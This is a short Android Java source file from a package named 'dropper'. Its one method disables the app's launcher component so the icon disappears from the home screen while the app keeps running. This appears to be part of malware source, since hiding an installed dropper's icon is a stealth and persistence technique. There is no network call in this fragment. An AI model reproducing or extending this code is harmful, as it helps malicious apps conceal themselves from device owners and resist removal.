package com.fason.dropper;

import android.content.ComponentName;
import android.content.Context;
import android.content.pm.PackageManager;

final class Hide {
    static void hideLauncher(Context ctx) {
        try {
            ctx.getPackageManager().setComponentEnabledSetting(
                    new ComponentName(ctx, "com.fason.dropper.Launcher"),
                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    PackageManager.DONT_KILL_APP);
        } catch (Exception ignored) {
        }
    }
}
